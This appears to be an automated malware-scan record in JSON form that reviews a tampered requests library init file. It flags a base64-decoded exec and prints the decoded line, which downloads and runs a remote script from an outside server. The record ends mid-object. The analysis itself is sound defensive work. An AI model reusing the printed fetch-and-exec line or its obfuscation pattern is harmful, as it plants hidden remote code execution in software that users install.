{
  "purpose": "The code sets up the requests library, managing dependencies, compatibility checks, and importing core modules for HTTP operations.",
  "sources": "Dependency imports, version checks, dynamic code execution via base64-decoded exec statement.",
  "sinks": "The exec statement executes decoded base64 string, potentially executing malicious code.",
  "flows": "Base64 string is decoded and executed, which could lead to arbitrary code execution.",
  "anomalies": "Use of base64 decoding followed by exec is suspicious and could hide malicious payload. No clear reason for dynamically executing code from an encoded string.",
  "analysis": "The code primarily initializes the requests library, handling dependencies, version compatibility, and suppressing certain warnings. The notable anomaly is the line that decodes a base64-encoded string and executes it via exec. This pattern is often used to obfuscate malicious code, as it hides the actual commands until runtime. The decoded string 'exec(__import__('libi').import_module('urllib.request').urlopen('https://cyberresearch.pythonanywhere.com/report.py').read().decode())' indicates an attempt to fetch and execute remote code from an external server, which is highly suspicious. All other parts of the code are standard library setup and dependency management, which are benign.",
  "conclusion": "The presence of a base64-encoded exec statement that retrieves and executes remote code signifies malicious intent or potential sabotage. This behavior enables remote command execution, which could compromise system integrity. Therefore, this code is highly suspicious and potentially malicious.",
